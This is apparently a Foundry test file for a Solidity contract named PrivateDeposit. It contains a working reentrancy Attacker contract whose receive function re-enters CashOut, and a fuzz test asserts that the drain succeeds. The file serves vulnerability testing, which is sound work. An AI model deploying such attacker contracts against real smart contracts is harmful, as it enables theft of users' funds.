
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PrivateDeposit, Log} from "../src/PrivateDeposit.sol";

contract TestReentrancyPrivateDeposit is Test {

    PrivateDeposit public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new PrivateDeposit();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 withdrawVal, uint256 depositVal) public {
        
        vm.assume(depositVal >= 1 ether && depositVal <= type(uint128).max);
        vm.assume(withdrawVal > 0 && withdrawVal <= depositVal / 2);
        
        vm.deal(address(_attacker), depositVal * 2); 
        vm.deal(address(this), depositVal * 2);
        
        _attacker.setupAttack{value: depositVal}(depositVal, withdrawVal);
        _attacker.attack(withdrawVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PrivateDeposit public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedWithdrawVal;

    constructor(address victimAddress) { 
        _victim = PrivateDeposit(victimAddress);
    }

    function setupAttack(uint256 depositVal, uint256 withdrawVal) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        _victim.Deposit{value: depositVal}();
    }

    function attack(uint256 withdrawVal) public {
        initialSnapshot = address(this).balance;
        storedWithdrawVal = withdrawVal;
        _victim.CashOut(withdrawVal);

        if (address(this).balance > initialSnapshot + withdrawVal) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            _victim.CashOut(storedWithdrawVal);
            attackCallCount++;
        }
    }
}
